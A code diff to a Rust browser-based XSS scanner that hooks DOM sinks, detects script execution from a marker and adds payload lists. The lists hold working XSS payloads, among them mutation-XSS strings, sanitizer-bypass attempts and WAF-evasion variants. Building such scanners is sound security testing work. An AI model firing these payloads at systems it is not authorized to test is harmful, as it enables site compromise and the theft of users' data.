@@ -523,24 +523,10 @@ const XSS_INTERCEPTOR: &str = r#"
         return origXHROpen.call(this, method, url, ...rest);
     };
 
-    // 7c. textContent and innerText hooks (CRITICAL - modern XSS often uses these)
-    ['textContent', 'innerText'].forEach(function(prop) {
-        try {
-            const desc = Object.getOwnPropertyDescriptor(Node.prototype, prop);
-            if (desc && desc.set) {
-                Object.defineProperty(Node.prototype, prop, {
-                    set: function(value) {
-                        if (checkMarker(value)) {
-                            recordExecution(prop, value, 'text-sink');
-                        }
-                        return desc.set.call(this, value);
-                    },
-                    get: desc.get,
-                    configurable: true
-                });
-            }
-        } catch(e) {}
-    });
+    // 7c. NOTE: textContent and innerText are NOT XSS sinks!
+    // They set text content which is always HTML-encoded by the browser.
+    // el.textContent = '<script>alert(1)</script>' displays as literal text, not code.
+    // We deliberately DO NOT hook these to avoid false positives.
 
     // 8. Location changes (open redirect / JS redirect)
     const originalLocationAssign = window.location.assign;
@@ -558,26 +544,72 @@ const XSS_INTERCEPTOR: &str = r#"
         };
     }
 
-    // 9. DOM Mutation Observer - detect marker appearing in DOM
+    // 9. DOM Mutation Observer - detect marker appearing in DANGEROUS contexts only
+    // CRITICAL: Text reflection is NOT XSS! The script must actually execute.
     const observer = new MutationObserver(function(mutations) {
         for (const mutation of mutations) {
             if (mutation.type === 'childList') {
                 for (const node of mutation.addedNodes) {
                     if (node.nodeType === 1) { // Element
-                        const html = node.outerHTML || '';
-                        if (checkMarker(html)) {
-                            recordExecution('DOM-mutation', html);
+                        const tagName = node.tagName ? node.tagName.toUpperCase() : '';
+
+                        // REAL XSS: Script tag was injected and will execute
+                        if (tagName === 'SCRIPT') {
+                            const content = node.textContent || node.src || '';
+                            if (checkMarker(content)) {
+                                recordExecution('DOM-script-injection', content);
+                            }
                         }
-                    } else if (node.nodeType === 3) { // Text
-                        if (checkMarker(node.textContent)) {
-                            recordExecution('DOM-text', node.textContent);
+
+                        // Check for injected script tags inside the element
+                        const scripts = node.querySelectorAll ? node.querySelectorAll('script') : [];
+                        for (const script of scripts) {
+                            const scriptContent = script.textContent || script.src || '';
+                            if (checkMarker(scriptContent)) {
+                                recordExecution('DOM-script-injection', scriptContent);
+                            }
                         }
+
+                        // Check for dangerous event handlers on the element
+                        const dangerousAttrs = ['onclick', 'onload', 'onerror', 'onmouseover', 'onfocus', 'onblur'];
+                        for (const attr of dangerousAttrs) {
+                            const attrValue = node.getAttribute ? node.getAttribute(attr) : null;
+                            if (attrValue && checkMarker(attrValue)) {
+                                recordExecution('DOM-event-handler', attr + '=' + attrValue);
+                            }
+                        }
+
+                        // Check for javascript: URLs in href/src
+                        const href = node.getAttribute ? node.getAttribute('href') : null;
+                        const src = node.getAttribute ? node.getAttribute('src') : null;
+                        if (href && href.toLowerCase().startsWith('javascript:') && checkMarker(href)) {
+                            recordExecution('DOM-javascript-url', href);
+                        }
+                        if (src && src.toLowerCase().startsWith('javascript:') && checkMarker(src)) {
+                            recordExecution('DOM-javascript-url', src);
+                        }
+
+                        // NOTE: Do NOT report text-only reflections like <div>MARKER</div>
+                        // That's NOT XSS - the script is HTML-encoded and not executing
                     }
+                    // NOTE: Text nodes (nodeType 3) are NEVER XSS by themselves
+                    // Text content is always safe - it's just displayed text
                 }
             } else if (mutation.type === 'attributes') {
+                const attrName = mutation.attributeName.toLowerCase();
                 const value = mutation.target.getAttribute(mutation.attributeName) || '';
-                if (checkMarker(value)) {
-                    recordExecution('DOM-attr', mutation.attributeName + '=' + value);
+
+                // Only report dangerous attribute mutations
+                const dangerousAttrs = ['onclick', 'onload', 'onerror', 'onmouseover', 'onfocus', 'onblur',
+                                        'onkeydown', 'onkeyup', 'onsubmit', 'onchange', 'oninput'];
+                if (dangerousAttrs.includes(attrName) && checkMarker(value)) {
+                    recordExecution('DOM-attr-event', attrName + '=' + value);
+                }
+
+                // javascript: URLs in href/src
+                if ((attrName === 'href' || attrName === 'src') &&
+                    value.toLowerCase().startsWith('javascript:') && checkMarker(value)) {
+                    recordExecution('DOM-attr-javascript-url', value);
                 }
             }
         }
@@ -616,24 +648,56 @@ const XSS_INTERCEPTOR: &str = r#"
     }
 
     // 12. Shadow DOM support - hook attachShadow to monitor shadow roots
+    // CRITICAL: Only detect EXECUTABLE contexts, not text reflections
     const originalAttachShadow = Element.prototype.attachShadow;
     Element.prototype.attachShadow = function(init) {
         const shadowRoot = originalAttachShadow.call(this, init);
 
-        // Observe shadow root for mutations
+        // Observe shadow root for mutations - only EXECUTABLE contexts
         const shadowObserver = new MutationObserver(function(mutations) {
             for (const mutation of mutations) {
                 if (mutation.type === 'childList') {
                     for (const node of mutation.addedNodes) {
                         if (node.nodeType === 1) {
-                            const html = node.outerHTML || '';
-                            if (checkMarker(html)) {
-                                recordExecution('shadow-DOM-mutation', html, 'shadow-root');
+                            const tagName = node.tagName ? node.tagName.toUpperCase() : '';
+
+                            // 1. Script tags in shadow DOM = real execution
+                            if (tagName === 'SCRIPT') {
+                                const content = node.textContent || node.src || '';
+                                if (checkMarker(content)) {
+                                    recordExecution('shadow-DOM-script', content, 'shadow-root');
+                                }
                             }
-                            // Check scripts inside shadow DOM
-                            if (node.tagName === 'SCRIPT' && checkMarker(node.textContent)) {
-                                recordExecution('shadow-DOM-script', node.textContent, 'shadow-root');
+
+                            // 2. Check for script tags inside the added element
+                            const scripts = node.querySelectorAll ? node.querySelectorAll('script') : [];
+                            for (const script of scripts) {
+                                const scriptContent = script.textContent || script.src || '';
+                                if (checkMarker(scriptContent)) {
+                                    recordExecution('shadow-DOM-script', scriptContent, 'shadow-root');
+                                }
                             }
+
+                            // 3. Check for dangerous event handlers on the element
+                            const dangerousAttrs = ['onclick', 'onerror', 'onload', 'onmouseover', 'onfocus'];
+                            for (const attr of dangerousAttrs) {
+                                const attrValue = node.getAttribute ? node.getAttribute(attr) : null;
+                                if (attrValue && checkMarker(attrValue)) {
+                                    recordExecution('shadow-DOM-event-handler', attr + '=' + attrValue, 'shadow-root');
+                                }
+                            }
+
+                            // 4. Check for javascript: URLs
+                            const href = node.getAttribute ? node.getAttribute('href') : null;
+                            const src = node.getAttribute ? node.getAttribute('src') : null;
+                            if (href && href.toLowerCase().startsWith('javascript:') && checkMarker(href)) {
+                                recordExecution('shadow-DOM-javascript-url', href, 'shadow-root');
+                            }
+                            if (src && src.toLowerCase().startsWith('javascript:') && checkMarker(src)) {
+                                recordExecution('shadow-DOM-javascript-url', src, 'shadow-root');
+                            }
+
+                            // NOTE: Do NOT flag text-only reflections in shadow DOM either
                         }
                     }
                 }
@@ -641,7 +705,7 @@ const XSS_INTERCEPTOR: &str = r#"
         });
         shadowObserver.observe(shadowRoot, {childList: true, subtree: true});
 
-        // Hook innerHTML on shadow root
+        // Hook innerHTML on shadow root - this IS a dangerous sink
         const origShadowInnerHTML = Object.getOwnPropertyDescriptor(ShadowRoot.prototype, 'innerHTML');
         if (origShadowInnerHTML && origShadowInnerHTML.set) {
             Object.defineProperty(shadowRoot, 'innerHTML', {
@@ -1173,40 +1237,92 @@ impl ChromiumXssScanner {
                     }
                 }
 
-                // CRITICAL: Also check if marker appears in DOM directly (for cases where hooks didn't fire)
+                // CRITICAL: Check if marker appears in EXECUTABLE context (not just text reflection)
+                // Text in <div>MARKER</div> is NOT XSS - it's safely encoded
+                // Only script tags, event handlers, javascript: URLs are real XSS
 
                 let dom_check_js = format!(r#"
                     (function() {{
                         const marker = '{}';
-                        const html = document.documentElement.innerHTML;
-                        if (html.includes(marker)) {{
-                            // Find WHERE in the DOM the marker appears
-                            let location = 'unknown';
-                            const walker = document.createTreeWalker(document.body, NodeFilter.SHOW_TEXT);
-                            while (walker.nextNode()) {{
-                                if (walker.currentNode.textContent.includes(marker)) {{
-                                    const parent = walker.currentNode.parentElement;
-                                    if (parent) {{
-                                        location = parent.tagName + (parent.className ? '.' + parent.className.split(' ')[0] : '');
-                                    }}
-                                    break;
-                                }}
+                        let xssFound = false;
+                        let location = 'none';
+                        let severity = 'NONE';
+
+                        // 1. Check for marker in <script> tags (CRITICAL - real execution)
+                        document.querySelectorAll('script').forEach(script => {{
+                            const content = script.textContent || script.src || '';
+                            if (content.includes(marker)) {{
+                                xssFound = true;
+                                location = 'SCRIPT tag';
+                                severity = 'CRITICAL';
                             }}
-                            // Also check element attributes
-                            if (location === 'unknown') {{
-                                document.querySelectorAll('*').forEach(el => {{
-                                    for (const attr of el.attributes) {{
-                                        if (attr.value.includes(marker)) {{
-                                            location = el.tagName + '[' + attr.name + ']';
-                                            return;
-                                        }}
+                        }});
+
+                        // 2. Check for marker in event handler attributes (onclick, onerror, etc.)
+                        if (!xssFound) {{
+                            const dangerousAttrs = ['onclick', 'onerror', 'onload', 'onmouseover', 'onfocus',
+                                                    'onblur', 'onkeydown', 'onkeyup', 'onsubmit', 'onchange',
+                                                    'oninput', 'onmouseenter', 'ontoggle', 'onstart'];
+                            document.querySelectorAll('*').forEach(el => {{
+                                for (const attr of dangerousAttrs) {{
+                                    const val = el.getAttribute(attr);
+                                    if (val && val.includes(marker)) {{
+                                        xssFound = true;
+                                        location = el.tagName + '[' + attr + ']';
+                                        severity = 'HIGH';
+                                        return;
+                                    }}
+                                }}
+                            }});
+                        }}
+
+                        // 3. Check for marker in javascript: URLs (href, src, action)
+                        if (!xssFound) {{
+                            document.querySelectorAll('[href], [src], [action]').forEach(el => {{
+                                ['href', 'src', 'action'].forEach(attr => {{
+                                    const val = el.getAttribute(attr);
+                                    if (val && val.toLowerCase().startsWith('javascript:') && val.includes(marker)) {{
+                                        xssFound = true;
+                                        location = el.tagName + '[' + attr + '=javascript:]';
+                                        severity = 'HIGH';
                                     }}
                                 }});
-                            }}
+                            }});
+                        }}
+
+                        // 4. Check for marker in iframe srcdoc (executes HTML)
+                        if (!xssFound) {{
+                            document.querySelectorAll('iframe[srcdoc]').forEach(iframe => {{
+                                const srcdoc = iframe.getAttribute('srcdoc') || '';
+                                if (srcdoc.includes(marker)) {{
+                                    xssFound = true;
+                                    location = 'IFRAME[srcdoc]';
+                                    severity = 'HIGH';
+                                }}
+                            }});
+                        }}
+
+                        // 5. Check for marker in SVG with script or event handlers
+                        if (!xssFound) {{
+                            document.querySelectorAll('svg').forEach(svg => {{
+                                const inner = svg.innerHTML || '';
+                                if (inner.includes(marker) && (inner.includes('<script') || inner.includes('on'))) {{
+                                    xssFound = true;
+                                    location = 'SVG (script/event)';
+                                    severity = 'HIGH';
+                                }}
+                            }});
+                        }}
+
+                        // NOTE: We deliberately DO NOT flag text-only reflections like:
+                        // <div>MARKER</div> or <span>user input: MARKER</span>
+                        // These are safely HTML-encoded and do NOT execute JavaScript
+
+                        if (xssFound) {{
                             window.__xssTriggered = true;
-                            window.__xssTriggerType = 'dom-content';
-                            window.__xssMessage = 'Marker found in: ' + location;
-                            window.__xssSeverity = 'HIGH';
+                            window.__xssTriggerType = 'dom-executable';
+                            window.__xssMessage = 'Executable XSS found in: ' + location;
+                            window.__xssSeverity = severity;
                             return location;
                         }}
                         return false;
@@ -1393,6 +1509,62 @@ impl ChromiumXssScanner {
         Ok(results)
     }
 
+    /// Poll for XSS trigger or DOM stability with exponential backoff
+    /// Returns early if XSS is detected, otherwise waits for DOM to stabilize
+    /// This replaces fixed sleeps with adaptive waiting for async SPAs
+    fn poll_for_xss_or_stability(tab: &Tab, max_wait_ms: u64, poll_interval_ms: u64) -> bool {
+        let start = std::time::Instant::now();
+        let mut last_dom_hash: Option<String> = None;
+        let mut stable_count = 0;
+
+        while start.elapsed().as_millis() < max_wait_ms as u128 {
+            // Check if XSS already triggered - early exit
+            let xss_check = r#"window.__xssTriggered || false"#;
+            if let Ok(result) = tab.evaluate(xss_check, false) {
+                if let Some(triggered) = result.value.and_then(|v| v.as_bool()) {
+                    if triggered {
+                        debug!("[Chromium-XSS] XSS detected during polling, returning early");
+                        return true;
+                    }
+                }
+            }
+
+            // Check DOM stability by hashing key elements
+            let dom_hash_js = r#"
+                (function() {
+                    // Hash key DOM metrics to detect render completion
+                    const body = document.body;
+                    if (!body) return 'no-body';
+                    const scripts = document.scripts.length;
+                    const elemCount = document.querySelectorAll('*').length;
+                    const pendingFetches = window.__xssRequests ? window.__xssRequests.length : 0;
+                    return scripts + '|' + elemCount + '|' + pendingFetches;
+                })()
+            "#;
+
+            if let Ok(result) = tab.evaluate(dom_hash_js, false) {
+                if let Some(hash) = result.value.and_then(|v| v.as_str().map(|s| s.to_string())) {
+                    if last_dom_hash.as_ref() == Some(&hash) {
+                        stable_count += 1;
+                        if stable_count >= 2 {
+                            // DOM has been stable for 2 poll intervals - render complete
+                            debug!("[Chromium-XSS] DOM stable after {}ms", start.elapsed().as_millis());
+                            return false;
+                        }
+                    } else {
+                        stable_count = 0;
+                        last_dom_hash = Some(hash);
+                    }
+                }
+            }
+
+            std::thread::sleep(Duration::from_millis(poll_interval_ms));
+        }
+
+        debug!("[Chromium-XSS] Max wait reached ({}ms)", max_wait_ms);
+        false
+    }
+
     /// Test a single URL and check for XSS execution
     fn test_single_url(
         browser: &SharedBrowser,
@@ -1427,8 +1599,13 @@ impl ChromiumXssScanner {
         // If this fails, we still check XSS since interceptor might have caught it
         let _ = tab.wait_until_navigated();
 
-        // Brief pause for JS execution
-        std::thread::sleep(Duration::from_millis(300));
+        // Poll for XSS or DOM stability instead of fixed sleep
+        // This handles async SPAs that render on different timings
+        if Self::poll_for_xss_or_stability(&tab, 800, 100) {
+            // XSS already triggered during initial render
+            return Self::check_xss_triggered(&tab, url, url)?
+                .ok_or_else(|| anyhow::anyhow!("Failed to check XSS result"));
+        }
 
         // Reset marker after navigation (SPAs may overwrite globals during hydration)
         let _ = tab.evaluate(
@@ -1456,8 +1633,8 @@ impl ChromiumXssScanner {
             })();
         "#, false);
 
-        // Wait for event handlers to execute
-        std::thread::sleep(Duration::from_millis(300));
+        // Poll again after triggering events - some handlers may trigger async
+        Self::poll_for_xss_or_stability(&tab, 500, 100);
 
         // Check if XSS was triggered
         Self::check_xss_triggered(&tab, url, url)?
@@ -1510,7 +1687,7 @@ impl ChromiumXssScanner {
                         "location.assign" | "location.replace" => XssTriggerType::LocationChange,
                         "fetch-url" | "img.src" => XssTriggerType::DataExfil,
                         "fetch-response" | "fetch-response-bootstrap" | "xhr-response" => XssTriggerType::InnerHtml, // Response contains XSS
-                        "textContent" | "innerText" => XssTriggerType::DomExecution,
+                        // NOTE: textContent/innerText removed - they are NOT XSS sinks (always HTML-encode)
                         s if s.contains("shadow") => XssTriggerType::ShadowDom,
                         s if s.starts_with("dom-") => XssTriggerType::DomExecution, // dom-html, dom-event-attribute, etc
                         s if s.starts_with("js-") => XssTriggerType::Eval,          // js-eval, js-function
@@ -1648,14 +1825,80 @@ impl ChromiumXssScanner {
             "<input onfocus=alert('MARKER') autofocus>".to_string(),
             "<marquee onstart=alert('MARKER')>".to_string(),
             "<script>alert`MARKER`</script>".to_string(),
+            // Template literal bypass
+            "<script>alert`MARKER`</script>".to_string(),
+            // Event handlers with encoding bypass
+            "<img src=x onerror=\"alert('MARKER')\">".to_string(),
+            "<svg/onload=alert('MARKER')>".to_string(),
+        ];
+
+        // mXSS payloads - exploit browser HTML parser mutations
+        // These look safe but get mutated into executable XSS by the browser
+        let mxss = vec![
+            // Classic mXSS via backtick in attribute (Chrome/Firefox)
+            "<img src=\"`><script>alert('MARKER')</script>\">".to_string(),
+            // mXSS via noscript parsing differential
+            "<noscript><p title=\"</noscript><script>alert('MARKER')</script>\">".to_string(),
+            // mXSS via style parsing in SVG foreignObject
+            "<svg><foreignObject><style><![CDATA[</style><script>alert('MARKER')</script>]]></style></foreignObject></svg>".to_string(),
+            // mXSS via table parsing quirks
+            "<table><tr><td><style></td><script>alert('MARKER')</script></style></tr></table>".to_string(),
+            // mXSS via form parsing
+            "<form><button formaction=\"javascript:alert('MARKER')\">".to_string(),
+            // mXSS via math/SVG namespace confusion
+            "<math><mtext><table><mglyph><style><img src=x onerror=alert('MARKER')>".to_string(),
+            // mXSS via annotation-xml
+            "<math><annotation-xml encoding=\"text/html\"><script>alert('MARKER')</script></annotation-xml></math>".to_string(),
+            // DOMPurify bypass attempts (historical)
+            "<svg></p><style><g title=\"</style><img src=x onerror=alert('MARKER')>\">".to_string(),
+        ];
+
+        // WAF bypass payloads
+        let waf_bypass = vec![
+            // Case variations
+            "<ScRiPt>alert('MARKER')</sCrIpT>".to_string(),
+            "<IMG SRC=x ONERROR=alert('MARKER')>".to_string(),
+            // Unicode/encoding bypasses
+            "<script>alert\u{FF08}'MARKER'\u{FF09}</script>".to_string(), // Fullwidth parentheses
+            // Null byte injection
+            "<scr\x00ipt>alert('MARKER')</script>".to_string(),
+            // HTML entity encoding
+            "<img src=x onerror=&#97;&#108;&#101;&#114;&#116;('MARKER')>".to_string(),
+            // Double encoding
+            "<img src=x onerror=\"&#x61;lert('MARKER')\">".to_string(),
+            // Newline/tab bypasses
+            "<img src=x one\nrror=alert('MARKER')>".to_string(),
+            "<img src=x one\trror=alert('MARKER')>".to_string(),
+            // Protocol handler bypasses
+            "<a href=\"&#106;avascript:alert('MARKER')\">click</a>".to_string(),
+            "<a href=\"java\tscript:alert('MARKER')\">click</a>".to_string(),
+            // SVG-specific bypasses
+            "<svg><animate onbegin=alert('MARKER') attributeName=x dur=1s>".to_string(),
+            "<svg><set onbegin=alert('MARKER') attributename=x to=y>".to_string(),
+            // iframe srcdoc (often missed by WAFs)
+            "<iframe srcdoc=\"<script>alert('MARKER')</script>\">".to_string(),
+            // Object/embed bypasses
+            "<object data=\"javascript:alert('MARKER')\">".to_string(),
+            // Template injection context
+            "{{constructor.constructor('alert(\"MARKER\")')()}}".to_string(),
+            "${alert('MARKER')}".to_string(),
         ];
 
         match mode {
             ScanMode::Fast => base[..3].to_vec(),
             ScanMode::Normal => base,
-            _ => {
+            ScanMode::Thorough => {
                 let mut all = base;
                 all.extend(advanced);
+                all.extend(mxss);
+                all
+            }
+            _ => {
+                // Insane mode - all payloads
+                let mut all = base;
+                all.extend(advanced);
+                all.extend(mxss);
+                all.extend(waf_bypass);
                 all
             }
         }
